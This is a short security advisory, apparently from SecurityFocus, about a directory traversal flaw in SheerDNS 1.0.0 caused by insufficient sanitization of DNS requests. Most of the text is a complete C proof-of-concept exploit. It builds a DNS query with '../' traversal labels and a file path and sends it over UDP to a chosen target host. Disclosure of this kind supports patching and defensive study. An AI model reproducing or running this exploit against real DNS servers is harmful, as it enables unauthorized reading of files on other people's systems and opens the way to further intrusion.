source: http://www.securityfocus.com/bid/7336/info

A vulnerability has been discovered in SheerDNS. Due to insufficient sanitization of DNS requests, an attacker may be able to view the contents of an arbitrary system directory or file. Information obtained by exploiting this issue may aid an attacker in launching further attacks against a target system.

This issue was discovered in SheerDNS version 1.0.0, however, earlier versions may also be affected. 

/*
 * SheerDNS 1.0.0 directory traversal POC.
 * Jedi/Sector One <j@pureftpd.org>
 */

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <getopt.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

void fill(char * const msg_, size_t *len)
{
    register char *msg = msg_;
    
    /* ID */
    *msg++ = 2;
    *msg++ = 4;
    
    /* QR/OPCODE/AA/TC/RD/RA/Z */
    *msg++ = 5;
    *msg++ = 0;
    
    /* QDCOUNT */
    *msg++ = 0;
    *msg++ = 1;

    /* ANCOUNT */
    *msg++ = 0;
    *msg++ = 0;

    /* NSCOUNT */
    *msg++ = 0;
    *msg++ = 0;

    /* ARCOUNT */
    *msg++ = 0;
    *msg++ = 0;
    
    /* QUERY */
    
    *msg++ = 3; strcpy(msg, "../"); msg += 3;
    *msg++ = 2; strcpy(msg, "./"); msg += 2;
    *msg++ = 2; strcpy(msg, "./"); msg += 2;
    *msg++ = 2; strcpy(msg, "./"); msg += 2;
    *msg++ = 2; strcpy(msg, "./"); msg += 2;    

    *msg++ = 12; strcpy(msg, "/tmp/passwd"); msg += 11; *msg++ = 0; 
    
    *msg++ = 0;
    
    /* QTYPE */
    *msg++ = 0;
    *msg++ = 1;
    
    /* QCLASS */
    *msg++ = 0;
    *msg++ = 1;
    
    /* FCS */
    *msg++ = 0xc8;
    *msg++ = 0x4c;
    
    /* STOP */
    *msg++ = 0x7e;
    
    *len = (size_t) (msg - msg_);
}

void usage(const char * const prgname)
{
    printf("Usage : %s [-s <source host>] -t <target host>\n",
           prgname);
    exit(0);
}

int main(int argc, char *argv[])
{
    char msg[65500];
    struct addrinfo hints, *res;
    const char *source_host = NULL;
    const char *target_host = NULL;
    size_t len;
    int kindy;
    int fodder;
    
    while ((fodder = getopt(argc, argv, "s:t:")) != -1) {
        switch (fodder) {
        case 's' :
            if ((source_host = strdup(optarg)) == NULL) {
                perror("strdup");
                return 1;
            }
            break;
        case 't' :
            if ((target_host = strdup(optarg)) == NULL) {
                perror("strdup");
                return 1;
            }
            break;
        default :
            usage(argv[0]);
        }
    }
    if (source_host == NULL || target_host == NULL) {
        usage(argv[0]);
    }
    fill(msg, &len);
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;
    hints.ai_addr = NULL;
    if ((fodder = getaddrinfo(source_host, NULL, &hints, &res)) != 0) {
        fprintf(stderr, "getaddrinfo : %s\n", gai_strerror(fodder));
        return 1;
    }    
    if ((kindy = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
        perror("socket");
        return 1;
    }
    if (bind(kindy, (struct sockaddr *) res->ai_addr,
             res->ai_addrlen) != 0) {
        perror("bind");
        return 1;
    }
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;
    hints.ai_addr = NULL;
    if ((fodder = getaddrinfo(target_host, "domain", &hints, &res)) != 0) {
        fprintf(stderr, "getaddrinfo : %s\n", gai_strerror(fodder));
        return 1;
    }
    if (sendto(kindy, msg, len, 0, (const struct sockaddr *) res->ai_addr,
               (socklen_t) res->ai_addrlen) <= (ssize_t) 0) {
        perror("sendto");
        return 1;
    }
    (void) close(kindy);
    
    return 0;
}
